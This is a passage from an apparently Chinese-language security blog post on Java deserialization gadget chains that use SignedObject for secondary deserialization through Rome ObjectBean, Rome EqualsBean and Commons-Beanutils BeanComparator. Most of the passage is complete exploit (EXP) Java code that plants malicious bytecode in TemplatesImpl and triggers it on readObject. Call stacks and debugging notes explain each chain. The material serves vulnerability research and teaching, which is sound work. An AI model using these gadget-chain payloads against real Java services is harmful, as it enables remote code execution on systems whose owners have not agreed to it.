class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> getpayload(Templates.class, obj);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> getpayload(SignedObject.class, signedObject);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap2);<br>        oos.close();<br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getpayload</span><span class="hljs-params">(Class clazz, Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;rand&quot;</span>));<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean, <span class="hljs-string">&quot;rand&quot;</span>);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">expObjectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(clazz, obj);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_equalsBean&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>调用栈为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">getObject:<span class="hljs-number">180</span>, SignedObject (java.security)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">137</span>, ToStringBean (com.sun.syndication.feed.impl)<br>toString:<span class="hljs-number">116</span>, ToStringBean (com.sun.syndication.feed.impl)<br>toString:<span class="hljs-number">120</span>, ObjectBean (com.sun.syndication.feed.impl)<br>beanHashCode:<span class="hljs-number">193</span>, EqualsBean (com.sun.syndication.feed.impl)<br>hashCode:<span class="hljs-number">110</span>, ObjectBean (com.sun.syndication.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>readObject:<span class="hljs-number">1413</span>, HashMap (java.util)<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<h4 id="Rome-Equals"><a href="#Rome-Equals" class="headerlink" title="Rome(Equals)"></a>Rome(Equals)</h4><p>‍</p>
+<p>利用链</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Hashtable#readObject() -&gt; EqualsBean#equals() -&gt; EqualsBean.beanEquals() -&gt; SignedObject#getObject()<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124327.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sign_RomeEqualsBean</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table1</span> <span class="hljs-operator">=</span> getPayload(Templates.class, obj);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table2</span> <span class="hljs-operator">=</span> getPayload(SignedObject.class, signedObject);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(table2);<br>        oos.close();<br>        <span class="hljs-comment">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">getPayload</span> <span class="hljs-params">(Class clazz, Object payloadObj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(String.class, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, bean);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, payloadObj);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, bean);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, payloadObj);<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        table.put(map1, <span class="hljs-string">&quot;1&quot;</span>);<br>        table.put(map2, <span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(bean, <span class="hljs-string">&quot;_beanClass&quot;</span>, clazz);<br>        setFieldValue(bean, <span class="hljs-string">&quot;_obj&quot;</span>, payloadObj);<br>        <span class="hljs-keyword">return</span> table;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>调用栈</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">getObject:177, SignedObject (java.security)<br>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<br>invoke:62, NativeMethodAccessorImpl (sun.reflect)<br>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:498, Method (java.lang.reflect)<br>beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)<br>equals:103, EqualsBean (com.sun.syndication.feed.impl)<br>equals:495, AbstractMap (java.util)<br>reconstitutionPut:1241, Hashtable (java.util)<br>readObject:1215, Hashtable (java.util)<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h4><p>‍</p>
+<p>这里也快速分析下CB链调用getter的流程吧</p>
+<p>以下形式来直接动态获取值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(student, <span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124497.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这里断点进去看看是如何实现传入<code>name</code>​就调用<code>getName</code>​方法的</p>
+<p>进去后发现会去调用<code>getNestedProperty</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124686.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>跟进后发现他是去判断我们传入的类是什么类型的，如果都不属于下图中类就调用<code>getSimpleProperty</code>​方法</p>
+<p>‍</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124844.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后也是进去一系列判断如果都不属于这些类就调用<code>getPropertyDescriptor</code>​方法</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124087.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>而这个就是重点方法了，这里其实不需要去看他怎么实现的，他会返回<code>PropertyDescriptor类</code>​我们直接看他返回的对象<code>descriptor</code>​即可</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124291.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以发现他返回了几个属性，恰好就是setter getter方法名字</p>
+<p>再接着往下就是获取方法的名字，然后去调用641行的反射</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124454.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124675.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以到这里我们又可以想象<code>Fastjson</code>​一样，假设谁的 <code>PropertyUtils.getProperty</code>​ 传参是可控的，那么找到一个函数的 getter 是有危险行为的，那么通过CB链就可以去触发导致代码执行(而在Fastjson中也是有这种情况发生，所以后半段恶意类加载就可以利用<code>TemplatesImpl</code>​链来完成)</p>
+<p>我们可以来写一个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">facField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        facField.setAccessible(<span class="hljs-literal">true</span>);<br>        facField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>        System.out.println(PropertyUtils.getProperty(templates, <span class="hljs-string">&quot;outputProperties&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124837.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么现在已经后半条链已经衔接好了，现在就是去找jdk跟CB依赖中进行衔接的反序列化点</p>
+<p>也就是去找谁去调用了<code>getProperty</code>​方法</p>
+<p>‍</p>
+<p>于是找到了 <code>commons-beanutils-1.8.3.jar!\org\apache\commons\beanutils\BeanComparator#compare()</code>​方法</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124045.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这写法跟CC4的太像了真的，所以找到<code>compare()</code>​就可以联想到CC4的入口直接拼起来就可以串起来了</p>
+<p>其实在这里我一直有个疑问，就是这个<code>compare()</code>​到底是否可控，因为他传两个参数我并不知道是在哪里可以控制的，调试了下也明白了，如下图</p>
+<p>可以发现在721行是将<code>x</code>​传入，那么<code>x</code>​怎么进来的呢？</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124565.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>在上一个方法中就把<code>x</code>​传进来了</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124759.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124917.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>在<code>heapify</code>​中就传了对象，再往上跟就是<code>readObject</code>​了，而在<code>heapify</code>​中进行了数组的右移所以可以寻找到该属性通过 <code>priorityQueue.add(templates);</code>​传入的类,如果我们传入 <code>3</code>​ 就会不一样了</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125105.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>就会变成数字类<code>3</code>​ 这也就是为什么我们队列这里要写入<code>TemplatesImpl</code>​类，这样子才能去调用到<code>TemplatesImpl</code>​类的getter方法</p>
+<p>‍</p>
+<p>调用链</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PriorityQueue#ReadObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">PriorityQueue#siftDownUsingComparator()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">BeanComparator#compare()</span> <span class="hljs-string">-&gt;PropertyUtilsBean#getSimpleProperty()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">TemplatesImpl#getOutputProperties()</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB_SignedObject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue1</span> <span class="hljs-operator">=</span> getpayload(obj, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(queue1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue2</span> <span class="hljs-operator">=</span> getpayload(signedObject, <span class="hljs-string">&quot;object&quot;</span>);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(queue2);<br>        oos.close();<br>        <span class="hljs-comment">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PriorityQueue&lt;Object&gt; <span class="hljs-title function_">getpayload</span><span class="hljs-params">(Object object, String string)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, string);<br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span 